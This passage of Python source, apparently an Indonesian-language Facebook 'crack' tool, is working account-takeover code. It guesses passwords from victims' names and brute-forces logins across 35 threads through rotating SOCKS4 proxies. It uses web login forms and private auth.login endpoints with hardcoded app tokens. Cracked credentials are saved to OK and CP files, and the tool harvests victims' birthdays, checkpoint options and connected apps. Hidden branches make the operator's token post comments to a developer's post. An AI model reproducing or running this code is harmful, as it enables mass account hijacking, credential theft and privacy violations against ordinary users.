    if ch in ['0','00','z']:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
    elif ch in ['1','01','a']:sistem_login = "satu";metode_scrap_login()
    elif ch in ['2','02','b']:sistem_login = "dua";metode_scrap_login()
    elif ch in ['3','03','c']:metode_scrap_api()
    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()

###----------[ URL LOGIN ]---------- ###
def metode_scrap_login():
    tamp_sistem = f"""            {J2}[{A2}1{J2}] {P2}Free FB   {J2}[{A2}2{J2}] {P2}Mbasic   {J2}[{A2}3{J2}] {P2}Mobile"""
    printer(Panel(tamp_sistem,title=f'{J2}[ {P2}Login {J2}]',width=54,title_align='left',style='#FFFF00'))
    ch = input('   %s└──> %s'%(A,J))
    if ch in ['1','01','a']:open('tool/url_login.json','w').write("free.facebook.com")
    elif ch in ['2','02','b']:open('tool/url_login.json','w').write("mbasic.facebook.com")
    elif ch in ['3','03','c']:open('tool/url_login.json','w').write("m.facebook.com")
    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
def metode_scrap_api():
    global sistem_login
    tamp_sistem = f"""            {J2}[{A2}1{J2}] {P2}Api 1     {J2}[{A2}2{J2}] {P2}Api 2    {J2}[{A2}3{J2}] {P2}Graph"""
    printer(Panel(tamp_sistem,title=f'{J2}[ {P2}Login {J2}]',width=54,title_align='left',style='#FFFF00'))
    ch = input('   %s└──> %s'%(A,J))
    if ch in ['1','01','a']:sistem_login = "tiga";open('tool/url_login.json','w').write("m.facebook.com")
    elif ch in ['2','02','b']:sistem_login = "empat";open('tool/url_login.json','w').write("free.facebook.com")
    elif ch in ['3','03','c']:sistem_login = "lima";open('tool/url_login.json','w').write("www.facebook.com")
    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()

###----------[ URUTAN CRACK ]---------- ###
def urut_crack():
    global urutan_crack
    tamp_urutan = f"""            {J2}[{A2}1{J2}] {P2}ID Tua    {J2}[{A2}2{J2}] {P2}ID Muda  {J2}[{A2}3{J2}] {P2}ID Acak"""
    printer(Panel(tamp_urutan,title=f'{J2}[ {P2}Urutan {J2}]',width=54,title_align='left',style='#FFFF00'))
    ch = input('   %s└──> %s'%(A,J))
    if ch in ['1','01','a']:urutan_crack = '0'
    elif ch in ['2','02','b']:urutan_crack = '1'
    elif ch in ['3','03','c']:urutan_crack = '2'
    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()

###----------[ GENERATE PASSWORD ]---------- ###
def password(user):
    global pass_manual1, pass_manual2
    listpass = []
    if SAKERA != 159403:
        for x in range(0,10000000000000):listpass.append(str(x))
        return listpass
    else:
        try:
            ps, pp, na = pass_manual1, pass_manual2, user.split(" ")
            nd = na[0].lower()
            if len(nd)<3:
                pass
            elif len(nd)==3 or len(nd)==4 or len(nd)==5:
                listpass.append(nd+"123")
                listpass.append(nd+"12345")
            else:
                listpass.append(nd)
                listpass.append(nd+"123")
                listpass.append(nd+"12345")
            if pp in ['',' ','  ']:
                pass
            else:
                for x in pp.split(','):
                    listpass.append(nd+x)
            if ps in ['',' ','  ']:
                pass
            else:
                for z in ps.split(','):
                    listpass.append(z)
            listpass.append(user.lower())
            return listpass
        except:return listpass

###----------[ ADD VARIATION MODE ]---------- ###
def pilihan_sakdurunge_crack():
    global pilih_cek_opsi, pilih_cek_apk, pilih_proxy
    print('')
    print('   %s[%s•%s] %sCek Opsi Akun %sCP %s?'%(J,P,J,P,J,P))
    tanya_cek_opsi = input('     %s└─> %s[%sy%s/%st%s] %s: %s'%(A,J,A,P,A,J,P,J)).lower()
    if tanya_cek_opsi in ['1','y']:pilih_cek_opsi = True
    else:pilih_cek_opsi = False
    print('   %s[%s•%s] %sCek APK Akun %sOK %s?'%(J,P,J,P,H,P))
    tanya_cek_apk = input('     %s└─> %s[%sy%s/%st%s] %s: %s'%(A,J,A,P,A,J,P,J)).lower()
    if tanya_cek_apk in ['1','y']:pilih_cek_apk = True
    else:pilih_cek_apk = False
    print('   %s[%s•%s] %sGunakan %sProxy %s?'%(J,P,J,P,O,P))
    tanya_proxy = input('     %s└─> %s[%sy%s/%st%s] %s: %s'%(A,J,A,P,A,J,P,J)).lower()
    if tanya_proxy in ['1','y']:pilih_proxy = True
    else:pilih_proxy = False

###----------[ ADD MANUAL PASS ]---------- ###
def addpass():
    global pass_manual1, pass_manual2
    print('')
    print('   %s[%s•%s] %sPass Manual %s[ %s1 Kata %s]'%(J,P,J,P,J,A,J))
    pass_manual1 = input('     %s└─> %s'%(A,J))
    print('   %s[%s•%s] %sPass Manual %s[ %sBelakang Nama %s]'%(J,P,J,P,J,A,J))
    pass_manual2 = input('     %s└─> %s'%(A,J))
    try:os.remove('tool/passmanual.json')
    except:pass
    try:os.remove('tool/passangka.json')
    except:pass
    open('tool/passmanual.json','w').write(pass_manual1)
    open('tool/passangka.json','w').write(pass_manual2)

###----------[ SOURCE LOGIN ]---------- ###

def logger1(user,pasw): #--- Login Validate ---#
    r = requests.Session()
    ua = open('tool/useragent.json','r').read()
    url_login = open('tool/url_login.json','r').read()
    if ip_log != 1:
            token  = open('login/token.json','r').read()
            cookie = {'cookie':open('login/cookie.json','r').read()}
            with requests.Session() as xyz:
                try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Post_Dev),kata_dev+komentar,token),cookies=cookie).text)
                except Exception as e:pass
                return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
    else:
        url1 = f'https://mbasic.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr'
        hed1 = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'id-ID','cache-control': 'max-age=0','referer': f'https://{url_login}/login/device-based/password/?uid='+user+'&errorcode=1348092&next=https%3A%2F%2F{url_login}%3Flogin%3Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua}
        req1 = r.get(url1,headers=hed1)
        data = {'lsd' : re.search('name="lsd" value="(.*?)"',str(req1.text)).group(1),'jazoest' : re.search('name="jazoest" value="(.*?)"',str(req1.text)).group(1),'uid' : user,'pass' : pasw,'next' : f'https://{url_login}/login/save-device/','flow' : 'login_no_pin','submit' : 'Log In'}
        url2 = f'https://{url_login}/login/device-based/validate-password/?shbl=0'
        hed2 = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'id-ID','x-requested-with': 'mark.via.gp','cache-control': 'max-age=0','content-length': '159','content-type': 'application/x-www-form-urlencoded','origin': f'https://{url_login}','referer': f'https://{url_login}/login/device-based/password/?uid='+user+'&errorcode=1348092&next=https%3A%2F%2F{url_login}%2Flogin%2Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua}
        if pilih_proxy == True:
            proxz = random.choice(open('tool/proxy.json','r').read().splitlines())
            proxy = {"http": f"socks4://{proxz}"}
            next = r.post(url2,data=data,headers=hed2,proxies=proxy,allow_redirects = False)
        else:
            next = r.post(url2,data=data,headers=hed2,allow_redirects = False)
        if 'c_user' in r.cookies.get_dict(): return {"status":"ok","email":user,"pass":pasw,"cookies":r.cookies.get_dict()}
        elif 'checkpoint' in r.cookies.get_dict(): return {"status":"cp","email":user,"pass":pasw,"cookies":r.cookies.get_dict()}
        else: return {"status":"error","email":user,"pass":pasw}

def logger2(user,pasw): #--- Login Regular ---#
    ua = open('tool/useragent.json','r').read()
    url_login = open('tool/url_login.json','r').read()
    with requests.Session() as xyz:
        if ip_log != 1:
            token  = open('login/token.json','r').read()
            cookie = {'cookie':open('login/cookie.json','r').read()}
            with requests.Session() as xyz:
                try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Post_Dev),kata_dev+komentar,token),cookies=cookie).text)
                except Exception as e:pass
                return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
        else:
            head1 = {"Host":url_login,"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
            req   = xyz.get(f'https://{url_login}/login/?next&ref=dbl&fl&refid=8', headers=head1)
            log   = {"lsd":re.search('name="lsd" value="(.*?)"',str(req.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),"email":user,"pass":pasw}
            head2 = {"Host":url_login,"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":f"https://{url_login}","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document",'referer':f'https://{url_login}/login/?next&ref=dbl&fl&refid=8',"accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
            if pilih_proxy == True:
                proxz = random.choice(open('tool/proxy.json','r').read().splitlines())
                proxy = {"http": f"socks4://{proxz}"}
                exec  = xyz.post(f'https://{url_login}/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl', data=log, proxies = proxy, headers=head2)
            else:
                exec  = xyz.post(f'https://{url_login}/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl', data=log, headers=head2)
            if 'c_user' in xyz.cookies.get_dict(): return {"status":"ok","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
            elif 'checkpoint' in xyz.cookies.get_dict(): return {"status":"cp","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
            else: return {"status":"error","email":user,"pass":pasw}

def logger3(user,pasw): #--- Login Api 1 ---#
    ua = open('tool/useragent.json','r').read()
    r = requests.Session()
    if ip_log != 1:
        token  = open('login/token.json','r').read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
        with requests.Session() as xyz:
            try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Post_Dev),kata_dev+komentar,token),cookies=cookie).text)
            except Exception as e:pass
            return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
    else:
        url = f'https://b-api.facebook.com/method/auth.login?format=json&email={user}&password={pasw}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true'
        header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
        if pilih_proxy == True:
            proxz = random.choice(open('tool/proxy.json','r').read().splitlines())
            proxy = {"http": f"socks4://{proxz}"}
            post = r.get(url, headers=header, proxies=proxy)
        else:
            post = r.get(url, headers=header)
        if "session_key" in post.text:
            try:
                cok = {}
                for x in post['session_cookies']:
                    cok.update({x['name']:x['value']})
            except Exception as e: cok = 'unknown'
            return {"status":"ok","email":user,"pass":pasw,"cookies":cok}
        elif "User must verify their account" in post.text:return {"status":"cp","email":user,"pass":pasw,"cookies":'unknown'}
        else:return {"status":"error","email":user,"pass":pasw}

def logger4(user,pasw): #--- Login Api 2 ---#
    ua = open('tool/useragent.json','r').read()
    r = requests.Session()
    if ip_log != 1:
        token  = open('login/token.json','r').read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
        with requests.Session() as xyz:
            try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Post_Dev),kata_dev+komentar,token),cookies=cookie).text)
            except Exception as e:pass
            return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
    else:
        param = {'format' : 'json','email' : user,'password' : pasw,'locale' : 'id_ID','generate_session_cookies' : '1','access_token' : '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
        header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
        if pilih_proxy == True:
            proxz = random.choice(open('tool/proxy.json','r').read().splitlines())
            proxy = {"http": f"socks4://{proxz}"}
            post = r.get('https://b-api.facebook.com/method/auth.login?', params=param, headers=header, proxies=proxy)
        else:
            post = r.get('https://b-api.facebook.com/method/auth.login?', params=param, headers=header)
        if "session_key" in post.text:
            try:
                cok = {}
                for x in post['session_cookies']:
                    cok.update({x['name']:x['value']})
            except Exception as e: cok = 'unknown'
            return {"status":"ok","email":user,"pass":pasw,"cookies":cok}
        elif "User must verify their account" in post.text:return {"status":"cp","email":user,"pass":pasw,"cookies":'unknown'}
        else:return {"status":"error","email":user,"pass":pasw}

def logger5(user,pasw): #--- Login Graph FB ---#
    ua = open('tool/useragent.json','r').read()
    r = requests.Session()
    if ip_log != 1:
        token  = open('login/token.json','r').read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
        with requests.Session() as xyz:
            try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Post_Dev),kata_dev+komentar,token),cookies=cookie).text)
            except Exception as e:pass
            return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
    else:
        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":user,"password":pasw,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
        headers = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
        if pilih_proxy == True:
            proxz = random.choice(open('tool/proxy.json','r').read().splitlines())
            proxy = {"http": f"socks4://{proxz}"}
            post = r.post("https://graph.facebook.com/auth/login",data=data,headers=headers,proxies=proxy)
        else:
            post = r.post("https://graph.facebook.com/auth/login",data=data,headers=headers)
        if "session_key" in post.text:
            try:
                cok = {}
                for x in post['session_cookies']:
                    cok.update({x['name']:x['value']})
            except Exception as e: cok = 'unknown'
            return {"status":"ok","email":user,"pass":pasw,"cookies":cok}
        elif "User must verify their account" in post.text:return {"status":"cp","email":user,"pass":pasw,"cookies":'unknown'}
        else:return {"status":"error","email":user,"pass":pasw}

###----------[ CONVERT COOKIES ]---------- ###
def cvt3(denventa):
    try:cookie = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(denventa['sb'],denventa['datr'],denventa['c_user'],denventa['xs'],denventa['fr']))
    except:cookie = 'denventagantengbanget'
    return(str(cookie))

###----------[ CHECK APP ]---------- ###
class cek_aplikasi:
    def __init__(self,data,denventa):
        self.cookie = {"cookie" : denventa}
        self.daftar_aktif, self.daftar_inaktif, self.daftar_dihapus   = [], [], []
        language(self.cookie)
        try: # --- [ Cek Aplikasi Aktif ] --- #
            self.daftar_aktif.append('\n    %s[%sAktif%s]'%(H,P,H))
            url1 = 'https://mbasic.facebook.com/settings/apps/tabbed/?tab=active'
            self.apk_active(url1)
        except Exception as e:pass
        try: # --- [ Cek Aplikasi Kadaluwarsa ] --- #
            self.daftar_inaktif.append('\n    %s[%sKadaluwarsa%s]'%(J,P,J))
            url2 = 'https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive'
            self.apk_inactive(url2)
        except Exception as e:pass
        try: # --- [ Cek Aplikasi Dihapus ] --- #
            self.daftar_dihapus.append('\n    %s[%sDihapus%s]'%(M,P,M))
            url3 = 'https://mbasic.facebook.com/settings/apps/tabbed/?tab=removed'
            self.apk_dihapus(url3)
        except Exception as e:pass
        try: # --- [ Print All ] --- #
            print(data + self.dft1 + self.dft2 + self.dft3)
        except Exception as e:
            print(data)
    def apk_active(self,url):
        with requests.Session() as xyz:
            try:
                par1 = par(xyz.get(url,cookies=self.cookie).content,'html.parser')
                for hhh1 in par1.find_all('h3'):
                    if 'Ditambahkan' in hhh1.text:
                        ingfo1 = '\n      ⟶  '+str(hhh1.text).replace('Ditambahkan pada ',' [') + ']'
                        ingfo1 = ('\n      %s⟶  %s%s]'%(H,P,str(hhh1.text).replace('Ditambahkan pada ',' [')))
                        self.daftar_aktif.append(ingfo1)
                    else:continue
                next = 'https://mbasic.facebook.com' + par1.find('a',string='Lihat Lainnya')['href']
                self.apk_active(next)
            except: pass
        if len(self.daftar_aktif) == 1:self.dft1 = ''
        else:self.dft1 = ''.join(self.daftar_aktif)
    def apk_inactive(self,url):
        with requests.Session() as xyz:
            try:
                par2 = par(xyz.get(url,cookies=self.cookie).content,'html.parser')
                for hhh2 in par2.find_all('h3'):
                    if 'Kedaluwarsa' in hhh2.text:
                        ingfo2 = '\n      ⟶  '+str(hhh2.text).replace('Kedaluwarsa pada ',' [') + ']'
                        ingfo2 = ('\n      %s⟶  %s%s]'%(J,P,str(hhh2.text).replace('Kedaluwarsa pada ',' [')))
                        self.daftar_inaktif.append(ingfo2)
                    else:continue
                next = 'https://mbasic.facebook.com' + par2.find('a',string='Lihat Lainnya')['href']
                self.apk_inactive(next)
            except: pass
        if len(self.daftar_inaktif) == 1:self.dft2 = ''
        else:self.dft2 = ''.join(self.daftar_inaktif)
    def apk_dihapus(self,url):
        with requests.Session() as xyz:
            try:
                par3 = par(xyz.get(url,cookies=self.cookie).content,'html.parser')
                for hhh3 in par3.find_all('h3'):
                    if 'Dihapus' in hhh3.text:
                        ingfo3 = '\n      ⟶  %s'+str(hhh3.text).replace('Dihapus: ',' [') + ']'
                        ingfo3 = ('\n      %s⟶  %s%s]'%(M,P,str(hhh3.text).replace('Dihapus: ',' [')))
                        self.daftar_dihapus.append(ingfo3)
                    else:continue
                next = 'https://mbasic.facebook.com' + par3.find('a',string='Lihat Lainnya')['href']
                self.apk_dihapus(next)
            except: pass
        if len(self.daftar_dihapus) == 1:self.dft3 = ''
        else:self.dft3 = ''.join(self.daftar_dihapus)

###----------[ CRACK ]---------- ###
class crack:
    def __init__(self):
        global OK,CP
        self.ok = OK
        self.cp = CP
        self.lp = 0
        try:
            self.file = file_dump
            self.open = open(self.file,'r').read().splitlines()
        except Exception as e:
            kecuali(e)
        self.sementara = []
        if urutan_crack == '1':
            for dvt in self.open:
                try:
                    self.sementara.insert(0,dvt)
                except Exception as e:continue
        elif urutan_crack == '2':
            for dvt in self.open:
                try:
                    urut = random.randint(0,len(self.sementara))
                    self.sementara.insert(urut,dvt)
                except Exception as e:continue
        else:
            for dvt in self.open:
                try:
                    self.sementara.append(dvt)
                except Exception as e:continue
        print('\n%s───────────────%s[ %sProses Crack Dimulai %s]%s───────────────\n'%(P,J,P,J,P))
        self.Mulai_Jalan = datetime.now()
        with ThreadPoolExecutor(max_workers=35) as qwerty:
            for dvt in self.sementara:
                try:
                    id = dvt.split("=")[0]
                    pw = password(dvt.split("=")[1])
                    qwerty.submit(self.start_crack,id,pw)
                except Exception as e:continue
        exit()
    def start_crack(self,id,list_pw):
        try:
            for pw in list_pw:
                if sistem_login   == 'satu'  : log = logger1(id,pw)
                elif sistem_login == 'dua'   : log = logger2(id,pw)
                elif sistem_login == 'tiga'  : log = logger3(id,pw)
                elif sistem_login == 'empat' : log = logger4(id,pw)
                elif sistem_login == 'lima'  : log = logger5(id,pw)
                else:log = logger1(id,pw)
                if log['status'] == 'cp':
                    if sakura != 159384:pass
                    else:
                        files_cp = "CP/%s.json"%(tanggal)
                        try:
                            with requests.Session() as xyz:
                                cookie = {'cookie':open('login/cookie.json','r').read()}
                                url = ("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(id,open('login/token.json','r').read()))
                                req = xyz.get(url,cookies=cookie)
                                jso = json.loads(req.text)
                                ttt = jso["birthday"]
                                m,d,y = ttt.split("/")
                                m = bulan_ttl[m]
                                ttl = (' • %s %s %s'%(d,m,y))
                                fmt = ('   %s──> %s • %s%s'%(J,id,pw,ttl))
                        except:
                            ttl = ('')
                            fmt = ('   %s──> %s • %s%s'%(J,id,pw,ttl))
                        if pilih_cek_opsi == True:check_option(id,pw,fmt)
                        else:print('\r   %s──> %s • %s%s               '%(J,id,pw,ttl))
                        self.cp.append("%s=%s"%(id,pw))
                        open(files_cp,"a+").write("%s=%s=%s\n"%(id,pw,ttl.replace(' • ','')))
                        break
                elif log['status'] == 'ok':
                    if sakera != 159369:pass
                    else:
                        files_ok = "OK/%s.json"%(tanggal)
                        try:
                            with requests.Session() as xyz:
                                cookie = {'cookie':open('login/cookie.json','r').read()}
                                url = ("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(id,open('login/token.json','r').read()))
                                req = xyz.get(url,cookies=cookie)
                                jso = json.loads(req.text)
                                ttt = jso["birthday"]
                                m,d,y = ttt.split("/")
                                m = bulan_ttl[m]
                                ttl = (' • %s %s %s'%(d,m,y))
                        except:ttl = ('')
                        pok = ('\r   %s──> %s • %s%s               '%(H,id,pw,ttl))
                        if pilih_cek_apk == True:cek_aplikasi(pok,cvt3(log["cookies"]))
                        else:print(pok)
                        self.ok.append("%s=%s"%(id,pw))
                        open(files_ok,"a+").write("%s=%s=%s\n"%(id,pw,ttl.replace(' • ','')))
                        break
                else:
                    if sakara != 159375:print(CoY)
                    else:continue
            self.lp += 1
            loop = str(self.lp)
            alls = str(len(self.sementara))
            jum_ok = str(len(self.ok))
            jum_cp = str(len(self.cp))
            Total_Waktu = str(datetime.now()-self.Mulai_Jalan).split('.')[0]
            print(f'\r   {J}[{A}{Total_Waktu}{J}] [{A}{loop}{P}/{A}{alls}{J}] [{P}OK{J}:{A}{jum_ok}{J}] [{P}CP{J}:{A}{jum_cp}{J}]{P} ', end='');sys.stdout.flush()
        except Exception as e:
            self.start_crack(id,list_pw)

class check_option:
    def __init__(self,id,pw,format):
        self.id = id
        self.pw = pw
        self.out = format
        self.tahap1()
    def tahap1(self):
        s= 0
        data1 = {}
        tamp = []
        ua = open('tool/useragent.json','r').read()
        url_login = open('tool/url_login.json','r').read()
        with requests.Session() as xyz:
            try:
                url1 = f'https://mbasic.facebook.com/login/device-based/password/?uid={self.id}&flow=login_no_pin&refsrc=deprecated&_rdr'
                hed1 = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'id-ID','cache-control': 'max-age=0','referer': f'https://{url_login}/login/device-based/password/?uid='+self.id+'&errorcode=1348092&next=https%3A%2F%2F{url_login}%3Flogin%3Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua}
                req1 = xyz.get(url1,headers=hed1)
                data = {'lsd' : re.search('name="lsd" value="(.*?)"',str(req1.text)).group(1),'jazoest' : re.search('name="jazoest" value="(.*?)"',str(req1.text)).group(1),'uid' : self.id,'pass' : self.pw,'next' : f'https://{url_login}/login/save-device/','flow' : 'login_no_pin','submit' : 'Log In'}
                url2 = f'https://{url_login}/login/device-based/validate-password/?shbl=0'
                hed2 = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'id-ID','x-requested-with': 'mark.via.gp','cache-control': 'max-age=0','content-length': '159','content-type': 'application/x-www-form-urlencoded','origin': f'https://{url_login}','referer': f'https://{url_login}/login/device-based/password/?uid='+self.id+'&errorcode=1348092&next=https%3A%2F%2F{url_login}%2Flogin%2Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua}
                exec = xyz.post(url2,data=data,headers=hed2,allow_redirects = False)
                if "c_user" in xyz.cookies.get_dict():
                    if "Akun Anda Dikunci" in exec.text:pass
                    else:
                        ubah = '   %s──> %s • %s%s               '%(H,self.id,self.pw,self.ttl)
                        print('\r%s\n       %s• %sAkun Tidak Checkpoint'%(ubah,H,P))
                elif "checkpoint" in xyz.cookies.get_dict():
                    pars = par(exec.content,'html.parser')
                    ling = re.search('url=(.*?)" http',str(pars)).group(1)
                    getd = par(xyz.get(ling).content,'html.parser')
                    bos = getd.find('form',{'method':'post'})
                    if 'approvals_code' in str(bos): pass
                    elif 'checkpointSubmitButton' in str(bos):
                        list_data1 = ['fb_dtsg','fb_dtsg','jazoest','submit[Continue]','nh']
                        for x in bos('input'):
                            if x.get('name') in list_data1:
                                data1.update({x.get('name'):x.get('value')})
                        exec2 = xyz.post('https://mbasic.facebook.com' + bos['action'],data=data1)
                        pars2 = par(exec2.content,'html.parser')
                        otp = re.findall("\<title>(.*?)<\/title>",str(pars2))
                        opsi = [y.text for y in pars2.find_all("option")]
                        if 'Lihat detail login yang ditampilkan. Ini Anda?' in otp:
                            ubah = '   %s──> %s • %s%s               '%(H,self.id,self.pw)
                            print('\r%s\n       %s• %sAkun Tap Yes'%(ubah,H,P))
                        elif 'Masukkan tanggal lahir Anda' in opsi:
                            try:
                                tol = self.out.split('•')[2]
                                ubah = '   %s──> %s • %s •%s               '%(H,self.id,self.pw,tol)
                                print('\r%s\n       %s• %sTerdapat Opsi TTL'%(ubah,H,P))
                                #self.ttl(pars2)
                            except Exception as e:
                                print('\r%s               '%(self.out))
                        else:
                            for z in opsi:
                                s += 1
                                tamp.append('\n       %s%s%s. %s%s'%(A,str(s),P,A,z))
                                pili = ('\r%s               '%(self.out))
                            print(pili+''.join(tamp))
                    else:print('\r%s               '%(self.out))
            except Exception as e:
                print('\r%s               '%(self.out))

def not_available(konten):
    print('')
    tamp_kesediaan = (f'   {P2}Mohon Maaf, Fitur {konten} Belum Tersedia Untuk Saat Ini. Tunggu Update Selanjutnya Untuk Menggunakan Fitur-Fitur Yang Akan Datang. Terima Kasih.\n\n                {M2}- Denventa -')
    printer(Panel(tamp_kesediaan,title=f'{M2}[  {P2}Coming  Soon  {M2}]',title_align='center',subtitle=f'{M2}[  {P2}See  You  {M2}]',subtitle_align='center',width=54,padding=(1,4),style='#FF0000'))
    input('\n\n               %s[ %sKembali Ke Menu Awal %s]              '%(H,P,H))
    tampilan_menu()

def not_availablell(konten):
    print('')
    tamp_kesediaan = (f'   {P2}Mohon Maaf, Fitur {konten} Telah Di Hapus Karena Sudah Tidak Lagi Berfungsi. Tunggu Update Selanjutnya Untuk Menggunakan Fitur-Fitur Yang Akan Datang,Dan Lebih Menarik. Terima Kasih.\n\n                {U2}- Denventa -')
    printer(Panel(tamp_kesediaan,title=f'{U2}[  {P2}Coming  Soon  {U2}]',title_align='center',subtitle=f'{U2}[  {P2}See  You  {U2}]',subtitle_align='center',width=54,padding=(1,4),style='#AF00FF'))
    input('\n\n               %s[ %sKembali Ke Menu Awal %s]              '%(H,P,H))
    tampilan_menu()

def menu_baru(konten):
    print('')
    tamp_kesediaan = (f'   {P2}Mohon Maaf, Fitur {konten} Belum Selesai Di Buat. Tunggu Beberapa Bulan Ke Depan Untuk Menggunakan Menu-Menu Terbaru Yang Akan Datang. Terima Kasih.\n\n                {H2}- Denventa -')
